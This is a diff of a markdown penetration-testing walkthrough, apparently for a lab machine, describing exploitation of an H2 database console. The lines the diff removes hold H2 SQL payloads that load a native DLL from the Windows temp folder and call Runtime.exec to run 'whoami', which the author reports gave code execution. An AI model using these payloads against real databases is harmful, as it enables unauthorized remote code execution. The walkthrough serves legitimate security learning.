@@ -147,11 +147,11 @@ Enumerated top 200 UDP ports:
 
 ![](Pasted%20image%2020221014212038.png)
 
-#### - Copied and pasted everything from the line below "-- Write native library" from the exploit code in the H2A database
+#### - Copied and pasted everything from the line below "-- Write native library" from the exploit code into the H2A database
 
-#### - Typed "CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";CALL System_load('C:\Windows\Temp\JNIScriptEngine.dll');" in the H2A database
+#### - Copied and pasted everything from the line below "-- Load native library" from the exploit code into the H2A database
 
-#### - Typed "CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval"; CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');" in the H2A database
+#### - Copied and pasted everything from the line below "-- Evaluate script" from the exploit code into the H2A database
 
 #### - Found we had code execution with command "whoami"
 
